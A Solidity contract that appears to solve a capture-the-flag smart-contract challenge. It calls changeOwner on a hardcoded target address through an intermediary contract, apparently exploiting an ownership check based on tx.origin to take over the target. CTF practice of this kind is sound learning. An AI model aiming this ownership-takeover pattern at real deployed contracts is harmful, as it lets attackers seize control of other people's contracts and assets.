// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Telephone {
    function changeOwner(address owner) external;
}

contract TelephoneSolver {
    Telephone tel;

    constructor() {
        tel = Telephone(0x20C450681B0519F0C11CCE76a98b7d8F1bC0992C);
    }

    function solve(address add) public {
        tel.changeOwner(add);
    }
}
